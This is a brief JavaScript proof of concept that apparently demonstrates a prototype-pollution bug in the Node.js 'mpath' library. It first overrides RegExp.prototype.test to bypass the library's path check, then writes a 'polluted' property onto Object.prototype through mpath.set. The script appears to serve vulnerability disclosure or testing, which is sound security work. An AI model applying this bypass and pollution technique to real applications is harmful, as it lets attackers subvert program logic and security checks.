RegExp.prototype.test = () => true;
var mpath = require('mpath');
var obj = {};
console.log({}.polluted);
mpath.set('__proto__.polluted', 'yes', obj);
console.log({}.polluted);